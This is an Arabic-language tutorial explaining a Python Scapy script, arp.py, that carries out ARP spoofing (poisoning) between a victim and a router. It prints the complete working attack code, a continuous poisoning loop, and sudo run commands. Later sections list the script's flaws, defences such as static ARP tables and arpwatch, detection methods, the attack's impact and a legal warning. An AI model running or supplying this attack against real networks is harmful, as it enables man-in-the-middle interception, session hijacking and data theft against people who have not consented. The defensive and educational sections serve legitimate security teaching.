# 🕵️ هجوم ARP Spoofing - arp.py

## 📋 نظرة عامة

هذا الملف يوضح كيفية تنفيذ هجوم ARP Spoofing (أو ARP Poisoning). هذا الهجوم يسمح للمهاجم بالتقاط حركة المرور بين الضحية والراوتر عن طريق تسميم جدول ARP.

## 🔍 شرح مفصل للكود

### 📦 الاستيرادات
```python
from scapy.all import *
import time
```
- **scapy.all**: مكتبة قوية لمعالجة حزم الشبكة
- **time**: للتحكم في توقيت الهجوم

### 🎯 تعريف المتغيرات
```python
victim_ip = "192.168.1.10"
router_ip = "192.168.1.1"
attacker_mac = get_if_hwaddr("eth0")
```
- **victim_ip**: عنوان IP للضحية
- **router_ip**: عنوان IP للراوتر
- **attacker_mac**: عنوان MAC للمهاجم (يتم الحصول عليه تلقائياً)

### ⚔️ دالة التزوير
```python
def spoof(target_ip, spoof_ip):
    pkt = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(pkt, verbose=False)
```

**شرح كل سطر:**
- **def spoof(target_ip, spoof_ip)**: تعريف دالة التزوير
- **op=2**: نوع ARP packet (2 = ARP Reply)
- **pdst=target_ip**: عنوان IP الهدف
- **hwdst="ff:ff:ff:ff:ff:ff"**: عنوان MAC الهدف (broadcast)
- **psrc=spoof_ip**: عنوان IP مزور (يبدو أنه من الراوتر)
- **send(pkt, verbose=False)**: إرسال الحزمة بدون رسائل تفصيلية

### 🔄 حلقة الهجوم الرئيسية
```python
try:
    print("[*]srart attacking ...")
    while True:
        spoof(victim_ip, router_ip)
        spoof(router_ip, victim_ip)
        time.sleep(2)
```

**شرح كل سطر:**
- **try**: بداية معالجة الأخطاء
- **print("[*]srart attacking ...")**: رسالة بدء الهجوم
- **while True**: حلقة لا نهائية للهجوم المستمر
- **spoof(victim_ip, router_ip)**: إخبار الضحية أن المهاجم هو الراوتر
- **spoof(router_ip, victim_ip)**: إخبار الراوتر أن المهاجم هو الضحية
- **time.sleep(2)**: انتظار ثانيتين بين كل جولة

### 🛑 معالجة الإيقاف
```python
except KeyboardInterrupt:
    print("\n[*] إ ARP")
    send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwsrc="MAC"), count=3)
```

**شرح كل سطر:**
- **except KeyboardInterrupt**: عند الضغط على Ctrl+C
- **print("\n[*] إ ARP")**: رسالة إيقاف الهجوم
- **send(ARP(...), count=3)**: إرسال 3 حزم ARP صحيحة لاستعادة الاتصال

## 🚀 كيفية التنفيذ

### 1. تثبيت المتطلبات
```bash
pip install scapy
```

### 2. تشغيل الهجوم
```bash
sudo python3 arp.py
```

**ملاحظة**: تحتاج صلاحيات root لاستخدام scapy

### 3. إيقاف الهجوم
اضغط `Ctrl+C` لإيقاف الهجوم

## ⚠️ الثغرات في الكود

### 1. خطأ إملائي
```python
print("[*]srart attacking ...")  # يجب أن تكون "start"
```

### 2. عنوان MAC ثابت
```python
hwsrc="MAC"  # يجب أن يكون عنوان MAC حقيقي
```

### 3. عدم وجود تحقق من الأخطاء
الكود لا يتحقق من صحة عناوين IP أو وجود الأجهزة

## 🛡️ طرق الحماية من ARP Spoofing

### 1. Static ARP Tables
```bash
arp -s 192.168.1.1 00:11:22:33:44:55
```

### 2. ARP Monitoring
```bash
arpwatch -i eth0
```

### 3. Network Segmentation
فصل الشبكة إلى أجزاء مختلفة

### 4. Encryption
استخدام VPN أو HTTPS

### 5. ARP Spoofing Detection Tools
- arpwatch
- arpalert
- XArp

## 🔍 اكتشاف الهجوم

### 1. مراقبة جدول ARP
```bash
arp -a
```

### 2. استخدام Wireshark
مراقبة حزم ARP المشبوهة

### 3. برامج الحماية
- جدران الحماية الحديثة
- برامج مكافحة الفيروسات

## 📊 تأثير الهجوم

- **سرقة البيانات**: يمكن للمهاجم رؤية جميع البيانات
- **Man-in-the-Middle**: التحكم في الاتصالات
- **Session Hijacking**: سرقة الجلسات
- **DNS Spoofing**: توجيه المستخدمين لمواقع مزيفة

## ⚖️ الجوانب القانونية

- استخدام هذا الهجوم ضد أنظمة أخرى غير قانوني
- استخدم فقط على أنظمة خاصة بك
- احصل على إذن مكتوب قبل الاختبار 